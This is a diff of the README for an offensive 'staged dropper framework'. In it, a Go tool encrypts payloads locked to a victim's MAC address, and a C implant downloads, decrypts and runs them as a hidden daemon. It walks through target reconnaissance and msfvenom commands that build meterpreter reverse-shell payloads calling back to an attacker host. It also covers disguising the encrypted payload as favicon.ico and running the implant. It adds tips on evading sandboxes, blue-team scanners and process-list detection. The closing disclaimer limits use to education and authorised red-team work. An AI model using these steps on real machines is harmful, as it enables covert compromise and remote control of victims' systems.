@@ -9,6 +9,18 @@
 
 ---
 
+## 🧐 What is this tool?
+Symbiote is a **Staged Dropper Framework**. It consists of two parts:
+1.  **The Commander (Go CLI):** A tool for attackers to encrypt payloads and host a secure delivery server.
+2.  **The Implant (C Agent):** A lightweight program that runs on the victim, fetches the encrypted payload, decrypts it using the local hardware key, and executes it.
+
+### 💡 What problem does it solve?
+In modern Red Teaming, **Payload Delivery** is a critical point of failure.
+* **Problem:** If Blue Teams or Automated Sandboxes intercept your delivery URL, they can download your payload, analyze it, and write a signature for it before you even start your attack.
+* **Solution:** Symbiote ensures that **even if the Blue Team downloads your payload**, they cannot run it. The file is cryptographically locked to the physical hardware of the intended victim. Without the victim's specific network card (MAC address), the file is just useless noise.
+
+---
+
 ## 🏗️ Architecture
 
 Symbiote operates on a **"Lock and Key"** model:
@@ -18,35 +30,35 @@ Symbiote operates on a **"Lock and Key"** model:
 3.  **The Key (Implant):** A C-based dropper runs on the victim, detects its own MAC address, downloads the payload, decrypts it in memory, and executes it as a background daemon.
 
 
-✨ Key Features
+# ✨ Key Features
 🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target.
 
 🐧 🪟 Cross-Platform Support: Single codebase supports both Windows (WinHTTP, ShellExecute) and Linux (Sockets, Fork/Setsid).
 
 👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to ensure persistence.
 
-💾 Universal Dropper: Capable of dropping and executing any file type (ELF, EXE, Scripts), not just raw shellcode.
+💾 Universal Dropper: Capable of dropping and executing ANY file type (ELF, EXE, Python Scripts, Shell Scripts, PDFs), not just raw shellcode.
 
 🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners.
 
 📦 Installation & Build
 Before using the tool, you must compile the Commander (Go CLI) on your attacker machine.
 
-Prerequisites
+# Prerequisites
 Go (Golang): To build the commander tool.
 
 GCC / MinGW: To compile the C implant.
 
-Steps
+Target Access: You need to know the target's MAC address beforehand (Reconnaissance).
+
+# Steps
+
 Clone the Repository:
+git clone [https://github.com/007Atharvmd/Symbiote.git]
+cd Symbiote
 
-Bash
 
-git clone [https://github.com/YOUR_USERNAME/Project-Symbiote.git](https://github.com/YOUR_USERNAME/Project-Symbiote.git)
-cd Project-Symbiote
 Build the Tool:
-
-Bash
 
 # Initialize Go modules
 go mod tidy
@@ -59,72 +71,73 @@ go build -o symbiote main.go
 You now have the executable CLI tool (symbiote.exe or symbiote) ready to use.
 
 🚀 Usage Guide
-1. Reconnaissance
+# 1. Reconnaissance
 Obtain the MAC address of your target machine.
 
 Linux: ip link or ifconfig (e.g., 08-8F-C3-12-3F-0E)
 
 Windows: ipconfig /all
 
-2. Payload Generation
-Generate a Stageless payload (recommended for stability).
+# 2. Payload Generation
+You can use ANY executable payload (C2 Agents, Reverse Shells, Ransomware Simulators, etc.).
 
-Linux Payload:
-
-Bash
+# Example using MSFVenom (Stageless Meterpreter): Linux Payload:
 
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf -o malware.elf
-Windows Payload:
 
-Bash
+
+# Windows Payload:
 
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o malware.exe
-3. Weaponization (Encryption)
+
+
+# 3. Weaponization (Encryption)
 Use your compiled Symbiote tool to lock the payload to the target.
 
-Bash
 
-# Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>
+ Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>
 
-# Example (Windows PowerShell)
+ Example (Windows PowerShell)
 ./symbiote.exe build --mac 08-8F-C3-12-3F-0E --input malware.elf
 Output: favicon.ico (Encrypted file)
 
-4. Compile the Implant
-Compile the C loader for your target OS using GCC.
+# 4. Compile the Implant
+NOTE: Ideally, you should compile the implant on the victim machine (or a machine with the exact same OS architecture/libraries) to avoid compatibility issues like "GLIBC version mismatch."
 
 For Linux Targets:
 
-Bash
-
 gcc implant/implant.c -o implant-linux
+
+
 For Windows Targets:
 
-Bash
 
 gcc implant/implant.c -o implant.exe -lwinhttp -liphlpapi -lshell32
-5. Execution (The Attack)
+
+# 5. Execution (The Attack)
 Terminal 1: Attacker (C2 Server) Start the delivery server using your tool.
 
-Bash
-
-# Windows
+Windows
 ./symbiote.exe serve --port 8080
 
-# Linux
+Linux
 ./symbiote serve --port 8080
+
 Terminal 2: Victim (Implant) Run the compiled implant, pointing it to the attacker's IP.
 
-Bash
-
-# ./implant <ATTACKER_IP> <PORT>
+./implant <ATTACKER_IP> <PORT>
 ./implant-linux 192.168.1.50 8080
-⚠️ Operational Security (OpSec) Notes
+
+
+# ⚠️ Operational Security (OpSec) Notes
 Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this should be hardcoded or patched into the binary to avoid process listing detection (ps aux).
 
 Disk Drop: This tool acts as a Dropper (writes to %TEMP% or /tmp). While this ensures compatibility with complex binaries (ELF/EXE), it is less stealthy than pure in-memory injection.
 
-⚖️ Disclaimer
+# 🚧 Beta Notice
+This tool is currently in BETA. It has not been thoroughly tested on all Linux distributions or Windows versions. You may encounter issues with specific network configurations or library dependencies. Use with caution.
+
+# ⚖️ Disclaimer
 This project is for educational purposes and authorized Red Team engagements only.
 
 The author is not responsible for any misuse of this tool. Do not use this against systems you do not have explicit permission to test.
